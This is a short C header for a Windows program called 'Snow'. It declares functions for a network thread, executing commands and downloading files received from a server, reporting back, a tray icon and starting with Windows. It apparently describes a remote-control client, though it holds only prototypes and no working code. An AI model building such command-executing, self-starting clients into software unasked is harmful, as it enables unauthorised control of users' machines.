// Snow 2017-04-10
#pragma once

#include <Windows.h>

typedef struct {
	HWND hOutput;
	INT Sock;
	INT msgSock;
} SNOWDATA;

INT_PTR CALLBACK MainWndProc(HWND hMainWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
BOOL InitNetwork(SNOWDATA *data);
DWORD WINAPI NetThreadProc(LPVOID lParam);
BOOL ParseData(INT msgSock, HWND hOutput, TCHAR szDataRecv[], UINT RecvSize, IN_ADDR fromAddress);
LPTSTR GetFilenameFromUrl(const LPTSTR szUrl);
BOOL ExecuteCommand(INT msgSock, IN_ADDR ServerAddr, HWND hOutput, const LPTSTR lpCmdLine);
BOOL DownloadFile(const LPTSTR lpCmdLine, LPTSTR szSavePath);
VOID CleanNetwork(INT Sock, INT msgSock);
wchar_t * ANSIToUnicode(const char* str);
char * UnicodeToANSI(const wchar_t *str);
VOID AddTrayIcon(HWND hMainWnd, NOTIFYICONDATA *Data, UINT uSize);
BOOL SendMessageToServer(INT msgSock, IN_ADDR Address, LPTSTR szData, ULONG iDataSize);
VOID StartWithWindows(BOOL bSwitch);